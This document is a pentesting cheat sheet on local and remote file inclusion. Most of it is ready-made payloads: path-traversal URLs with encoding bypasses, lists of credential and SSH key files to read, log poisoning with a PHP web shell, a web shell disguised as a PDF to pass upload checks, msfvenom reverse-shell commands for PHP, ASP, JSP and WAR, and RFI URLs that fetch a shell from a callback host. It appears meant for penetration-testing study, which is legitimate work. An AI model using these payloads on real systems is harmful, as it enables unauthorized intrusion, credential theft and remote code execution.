# File Inclusion    
[PayloadAllTheThings FI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)  

## Local File Inclusion 
[Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
[Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
### File Upload Pages
Bypass extension filtering: rename file to an allowed extension (ie .php to .php.pdf file)        
Bypass header check:    

    %PDF-1.4
    <?php system($_GET["cmd"]); ?>

### LFI Testing    
Check for client side scripts     
Use a [LFI wordlist](https://github.com/Karmaz95/crimson/blob/master/words/exp/LFI) to fuzz.     
More wordlists: [file inclusion Linux](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt) and [file inclusion Windows](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)     

    http://example.com/index.php?page=../../../etc/passwd  
    http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 bypass
    http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00        # double encoding    
    http://example.com/index.php?page=....//....//etc/passwd
    http://example.com/index.php?page=..///////..////..//////etc/passwd
    http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
	
    /etc/passwd, etc.
    can you include a remote file?
    ?test=php://filter/convert.base64-encode/resource=/filepath      -> base64 encode /decode  
	
    http://example.labs/page.php?file=php://filter/resource=/etc/passwd             #php filter wrapper 
	
	
Vulnerable PHP functions

    include
    require
    include_once 
    require_once 
	
### Interesting Files 
Linux 

    /etc/passwd
    /etc/shadow
    /etc/issue
    /etc/group
    /etc/hostname
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /root/.ssh/id_rsa
    /root/.ssh/authorized_keys
    /home/user/.ssh/authorized_keys
    /home/user/.ssh/id_rsa

Windows 

    /boot.ini
    /autoexec.bat
    /windows/system32/drivers/etc/hosts
    /windows/repair/SAM

Log Poisoning 

	open: /log/apache2/access.log 
	send payload as user agent string: <?php system($_GET['cmd']); ?>    
	/log/apache2/access.log&cmd=id  
	
## Remote File Inclusion 
Turning LFI to RFI: https://l.avala.mp/?p=241
[Reference](https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html)  

## Web Payloads 

PHP

    <?php echo shell_exec($_GET['cmd']);?> 
    <?php system($_GET['cmd']);?>
    <?php passthru($_GET['cmd']);?>
      
      
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

WAR

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

### Testing 

    http://example.com/index.php?page=http://callback.com/shell.txt
    http://example.com/index.php?page=http://callback.com/shell.txt%00
    http://example.com/index.php?page=http:%252f%252fcallback.com%252fshell.txt
